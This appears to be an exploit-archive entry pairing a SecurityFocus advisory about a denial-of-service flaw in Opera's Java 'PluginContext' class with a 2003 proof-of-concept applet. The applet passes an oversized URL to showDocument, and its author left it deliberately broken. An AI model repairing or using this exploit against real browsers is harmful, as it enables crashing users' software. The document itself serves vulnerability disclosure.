@@ -1,0 +1,33 @@
+source: http://www.securityfocus.com/bid/6814/info
+
+Opera ships with a trusted Java class ('opera.PluginContext') that includes a native method that is reportedly prone to denial of service attacks. It is possible for a malicious Java applet to trigger this condition to cause a denial of service. This issue was reported in versions of Opera for Microsoft Windows operating systems. It is not known if other platforms are also affected. Java support must enabled for this issue to be present and can be disabled to prevent attacks. 
+
+//Marc Schoenefeld 1/13/2003, www.illegalaccess.org
+//not runnable, a little crippled, there are couple of obvious syntax errors
+to avoid script-kidding
+
+...
+import opera.PluginContext; // !! import the vulnerable class
+...
+
+public class OperaCall2 extends App1et
+{
+- -
+- - public OperaCall2()
+- - {
+- - }
+- -
+- - public void paint(Graphics g)
+- - {
+- - PluginContext plugincontext = new PluginContext(l);
+- - try
+- - {
+- - plugincontext.showDocument(new URL("http://xxx.xxx" + new
+String(new byte[30000])));
+- - }
+- - catch(Exception exception)
+- - {
+- - exception.printStackTrace();
+- - }
+- - }
+} 
